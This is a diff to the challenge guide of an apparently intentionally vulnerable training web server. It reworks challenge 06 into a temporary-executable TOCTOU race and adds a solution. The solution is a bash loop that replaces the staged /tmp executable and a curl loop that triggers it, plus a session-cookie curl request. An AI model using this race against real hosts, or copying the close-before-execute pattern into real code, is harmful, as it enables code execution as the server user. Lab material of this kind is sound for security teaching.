@@ -48,7 +48,7 @@ in a freed object, a session that unlocks admin-only setup steps.
 
 | #   | Challenge                                    | Class      | CWE     | Solution |
 |-----|----------------------------------------------|------------|---------|----------|
-| 06  | [Insecure Temp File (race)](#challenge-06)   | System     | CWE-377 | [06](#solution-06) |
+| 06  | [Insecure Temporary Executable Race](#challenge-06) | System | CWE-377 | [06](#solution-06) |
 | 08  | [Use-After-Free (LogSink)](#challenge-08)    | Memory     | CWE-416 | [08](#solution-08) |
 | 11  | [Type Confusion](#challenge-11)              | Memory     | CWE-843 | [11](#solution-11) |
 
@@ -72,7 +72,7 @@ table backs the [tracks](#tracks).
 | 03 | Format string          | stack disclosure (`%p`); write primitive (`%n`, advanced extension) | — |
 | 04 | Session fixation       | authenticated `admin` session                   | a planted/observed pre-auth cookie |
 | 05 | Predictable session    | authenticated `admin` session                   | mint time (±3 s) and the server PID |
-| 06 | Temp-file race         | command execution given local shell             | local shell (e.g. from 02 or 11) |
+| 06 | Temp-executable race   | command execution given local shell             | local shell (e.g. from 02 or 11) |
 | 07 | Identity-record leak   | stale-stack pointers — ASLR defeat              | — |
 | 08 | LogSink UAF            | controlled virtual call                         | a leak (01/03/07) + a heap groom (09) |
 | 09 | Decode-sizing overflow | precise heap write: chosen size class, chosen bytes | — |
@@ -500,31 +500,37 @@ curl -H "Cookie: session_id=SESSION_<predicted>" http://127.0.0.1:8081/admin/
 
 <a id="challenge-06"></a>
 
-## 06 · Insecure Temporary File Race (CWE-377 / CWE-367)
+## 06 · Insecure Temporary Executable Race (CWE-377 / CWE-367)
 
 ### Scenario
 
-Every request for a `.php` file writes the file's contents to
-`/tmp/php_script_<pid>.php` and then executes it with the PHP CLI. The
-filename is predictable and world-writable; there is a small TOCTOU
-window between `fclose(temp_file)` and `popen("php <path>")`.
+`GET /cgi-helper` stages a copy of the bundled native CGI helper
+executable (`dvws_cgi_helper`) at `/tmp/dvws_cgi_<pid>`, **closes** it,
+waits out an intentional window, then `chmod`s it and executes it via
+`popen()`. The filename is predictable and the staged file sits closed
+and replaceable in world-writable `/tmp` during the whole window: a
+textbook close-before-execute TOCTOU race.
 
 ### Endpoint
 
-`GET /*.php`
+`GET /cgi-helper`
 
 ### Sink
 
-`mime_type_handler.cpp` — `snprintf(temp_file_path, ..., "/tmp/php_script_%d.php", pid)`
+`mime_type_handler.cpp` — `snprintf(temp_file_path, ..., "/tmp/dvws_cgi_%d", pid)`
+followed by `fclose()` → window → `chmod()` → `popen(temp_file_path)`
 
 ### Hints
 
 1. What is the PID of the server process?
-2. Can you win the write between `fclose()` and `popen()`?
+2. The staged file is closed before it is executed. What can you do to
+   a closed file at a predictable path in a world-writable directory?
+3. Can you write your replacement between `fclose()` and `popen()`?
 
 ### Expected primitive
 
-Arbitrary PHP code execution as the server user given local shell access.
+Arbitrary native code execution as the server user given local shell
+access.
 
 ### Chaining
 
@@ -533,26 +539,35 @@ started remote.
 
 ### Regression test
 
-`tests/exploit/test_php_tmp_race.py`
+`tests/exploit/test_temp_exec_race.py`
 
 <a id="solution-06"></a>
 
-### Solution — 06 · Insecure Temp File Race
+### Solution — 06 · Insecure Temporary Executable Race
 
-**Code**: `mime_type_handler.cpp` → `/tmp/php_script_<pid>.php`.
+**Code**: `mime_type_handler.cpp` → `/tmp/dvws_cgi_<pid>`.
 
 Requires local shell access on the server host.
 
 ```bash
-# In one terminal: overwrite the temp file as fast as possible.
+# In one terminal: replace the staged executable as fast as possible.
 PID=$(pgrep damn_vulnerable_web)
 while :; do
-    echo "<?php system('id'); ?>" > "/tmp/php_script_${PID}.php" 2>/dev/null
+    printf '#!/bin/sh\nid\n' > "/tmp/dvws_cgi_${PID}" 2>/dev/null
+    chmod +x "/tmp/dvws_cgi_${PID}" 2>/dev/null
 done
 
-# In another terminal: trigger PHP requests until the race wins.
-while :; do curl -s http://127.0.0.1:8081/echo.php; done
+# In another terminal: trigger helper requests until the race wins.
+while :; do curl -s http://127.0.0.1:8081/cgi-helper; done
 ```
+
+The server `fopen()`s the predictable path (truncating whatever is
+there), copies the bundled helper in, `fclose()`s it, and then — after
+a deliberate window — `chmod 0755` and executes whatever now lives at
+that path as the server user. A write that lands in the window
+replaces the staged executable; the next thing the server runs is
+yours. The regression test wins the race the same way and checks the
+replaced program's output in the HTTP response.
 
 ---
 
